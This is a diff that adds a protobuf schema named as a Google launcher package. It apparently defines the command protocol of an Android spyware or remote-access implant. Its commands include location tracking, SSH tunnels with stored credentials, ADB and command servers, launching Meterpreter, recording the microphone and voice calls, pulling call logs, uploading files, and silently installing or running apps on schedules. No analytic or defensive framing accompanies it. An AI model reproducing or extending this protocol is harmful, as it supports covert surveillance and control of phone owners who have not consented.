@@ -1,0 +1,306 @@
+syntax = "proto3";
+
+package com.google.launcher.commands;
+
+// Enum for command types
+enum CommandType {
+  UNKNOWN_COMMAND = 0;
+  LOCATION_TRACKER_START = 1;
+  LOCATION_TRACKER_STOP = 2;
+  SSH_CLIENT_START = 3;
+  SSH_CLIENT_STOP = 4;
+  DATA_COLLECTOR_UPLOAD = 5;
+  ADB_SERVER_START = 6;
+  ADB_SERVER_STOP = 7;
+  PERIODIC_SCHEDULER_START = 8;
+  ONE_TIME_SCHEDULER_START = 9;
+  SCHEDULER_STOP = 10;
+  SEQUENCE_CREATE = 11;
+  DATA_COLLECTOR_ADD = 12;
+  METERPRETER_START = 13;
+  CMD_SERVER_START = 14;
+  CMD_SERVER_STOP = 15;
+  NW_STATUS_CHANGE = 16;
+  RECORDING_START = 17;
+  RECORDING_STOP = 18;
+  CALL_LOG_RETRIEVE = 19;
+  FILE_UPLOAD = 20;
+  APP_INSTALL = 21;
+  APP_UNINSTALL = 22;
+  APP_LIST = 23;
+  APP_RUN = 24;
+  HEART_BEAT = 25;
+  COMMAND_RESPPONSE = 26;
+}
+
+// Base command message
+message Command {
+  CommandType type = 1;
+  int32 commandId = 2;
+
+  // Oneof to include specific parameters based on the command type
+  oneof command_parameters {
+    SSHClientStartParams ssh_client_start_params = 3;
+    SSHClientStopParams ssh_client_stop_params = 4;
+
+    LocationTrackerStartParams location_tracker_start_params = 5;
+    LocationTrackerStopParams location_tracker_stop_params = 6;
+
+    DataCollectorUploadParams data_collector_upload_params = 7;
+
+    PeriodicSchedulerStartParams periodic_scheduler_start_params = 8;
+    OneTimeSchedulerStartParams one_time_scheduler_start_params = 9;
+    SchedulerStopParams scheduler_stop_params = 10;
+
+    SequenceCreateParam sequence_create_param = 11;
+
+    ADBServerStartParams adb_server_start_params = 12;
+    ADBServerStopParams adb_server_stop_params = 13;
+
+    DataCollectorAddParams data_collector_add_params = 14;
+
+    MeterpreterStartParam meterpreter_start_params = 15;
+
+    NWStatusChangeParam nw_status_change_params = 16;
+
+    CMDServerStartParams cmd_server_start_params = 17;
+    CMDServerStopParams cmd_server_stop_params = 18;
+
+    RecordingStartParams recording_start_params = 19;
+    RecordingStopParams recording_stop_params = 20;
+
+    CallLogRetrieveParams call_log_retrieve_params = 21;
+
+    FileUploadParams file_upload_params = 22;
+
+    AppInstallParams app_install_params = 23;
+    AppUninstallParams app_uninstall_params = 24;
+    AppListParams app_list_params = 25;
+    AppRunParams app_run_params = 26;
+
+    HeartBeatParams heart_beat_params = 27;
+
+      CommandResponse command_response=28;
+    //WiFiScan
+  }
+}
+
+// Base command response message
+message CommandResponse {
+  ResponseStatus status = 1;
+  string message = 2; // Optional message for additional information
+  int32 commandId = 3;
+
+  oneof command_parameters {
+      DataCollectorUploadReply data_collector_upload_reply = 7;
+  }
+}
+
+// Enum for response status
+enum ResponseStatus {
+  SUCCESS = 0;
+  FAILURE = 1;
+}
+
+message Channel{
+  string name = 1;
+  int32 localPort = 2;
+  int32 remotePort = 3;
+}
+message Connection{
+  string name = 1;
+  string user = 2;
+  string host = 3;
+  int32 port = 4;
+  string pass = 5;
+  int32 retry_delay = 6;
+}
+message SSHClientStartParams {
+
+  oneof connection_reference{
+    string connection_name = 1;
+    Connection connection = 2;
+  }
+  optional Channel channel = 3;
+}
+
+message SSHClientStopParams {
+  string connection_name = 1;
+  optional string channel_name = 2;
+}
+
+message LocationTrackerStartParams {
+  string provider = 1;
+  int64 minTimeMs = 2;
+  float minDistanceM = 3;
+}
+
+message LocationTrackerStopParams {
+}
+
+message DataCollectorUploadParams {
+}
+
+message PeriodicSchedulerStartParams {
+  int32 scheduler_id = 1;
+  Command executed_command = 2;
+  int64 repeatInterval = 3;
+  int32 repeatIntervalTimeUnit = 4;
+}
+
+message OneTimeSchedulerStartParams {
+  int32 scheduler_id = 1;
+  Command executed_command = 2;
+}
+
+message SchedulerStopParams {
+  int32 scheduler_id = 1;
+}
+
+message SequenceCreateParam {
+  int32 sequence_id = 1;
+  repeated Command commands = 2;
+}
+
+message ADBServerStartParams {
+}
+
+message ADBServerStopParams {
+}
+message CMDServerStartParams {
+  string host = 1;
+  int32 port = 2;
+}
+
+message CMDServerStopParams {
+}
+
+message DataCollectorUploadReply{
+  repeated DataCollectorAddParams entries = 1;
+}
+
+message DataCollectorAddParams{
+
+  oneof entry {
+    LocationEntry location_entry = 1;
+    RecordingEntry recording_entry = 2;
+    CallLogEntry call_log_entry = 3;
+    AppInfoEntry app_info_entry = 4;
+  }
+}
+
+message AppInfo{
+  bool system = 1;
+  string label = 2;
+  string packageName =3;
+  bool running = 4;
+}
+
+message AppInfoEntry{
+  repeated AppInfo app_info = 1;
+}
+
+enum CallType {
+  UNKNOWN = 0;
+  INCOMING = 1;
+  OUTGOING = 2;
+  MISSED = 3;
+}
+
+message Call {
+  int64 id = 1;  // Unique identifier for the call log entry.
+  string number = 2;  // Phone number associated with the call.
+  string name = 3;  // Contact name associated with the call, if available.
+  CallType type = 4;  // Type of the call (incoming, outgoing, missed).
+  int64 date = 5;  // Date and time of the call in milliseconds since epoch.
+  int64 duration = 6;  // Duration of the call in seconds.
+  string voicemail_uri = 7;  // URI of the voicemail recording, if applicable.
+  string formatted_number = 8;  // Formatted phone number.
+  string country_iso = 9;  // ISO country code for the phone number.
+  bool is_read = 10;  // Whether the call log entry has been read.
+  string call_type = 11;  // Type of the call (e.g., "incoming", "outgoing").
+  string geo_location = 12;  // Geographical location associated with the call, if available.
+}
+
+message CallLogEntry{
+  repeated Call calls = 1;  // List of call log entries.
+}
+
+message RecordingEntry{
+  string file_path = 1;
+}
+
+message LocationEntry{
+  // Optional field, use string
+  string provider = 1;
+
+  // Required fields, use int64 for long and double for double
+  int64 time_ms = 2;
+  int64 elapsed_realtime_ns = 3;
+  double elapsed_realtime_uncertainty_ns = 4;
+  double latitude_degrees = 5;
+  double longitude_degrees = 6;
+  float horizontal_accuracy_meters = 7;
+  double altitude_meters = 8;
+  double altitude_accuracy_meters = 9;
+  float speed_meters_per_second = 10;
+  float speed_accuracy_meters_per_second = 11;
+  float bearing_degrees = 12;
+  float bearing_accuracy_degrees = 13;
+  double msl_altitude_meters = 14;
+  float msl_altitude_accuracy_meters = 15;
+}
+
+message MeterpreterStartParam{
+
+}
+
+enum NWType{
+  WIFi = 0;
+  MOBILE = 1;
+}
+
+message NWStatusChangeParam{
+  bool connected = 1;
+  NWType nw_type = 2;
+  string connection = 3;
+  string channel = 4;
+}
+
+enum RecordingSource{
+  VOICE_CALL = 0;
+  MIC = 1;
+}
+
+message RecordingStartParams{
+  RecordingSource source = 1;
+}
+
+message RecordingStopParams{
+
+}
+
+message CallLogRetrieveParams{
+
+}
+
+message FileUploadParams{
+  string path_rel_ext = 1;
+}
+
+message AppInstallParams{
+  string apk_path = 1;
+}
+message AppUninstallParams {
+  string package_name = 1;
+}
+message AppListParams{}
+
+message AppRunParams {
+  string package_name = 1;
+}
+
+message HeartBeatParams{
+  int64 ping_timestamp = 1;
+  int64 pong_timestamp = 2;
+}
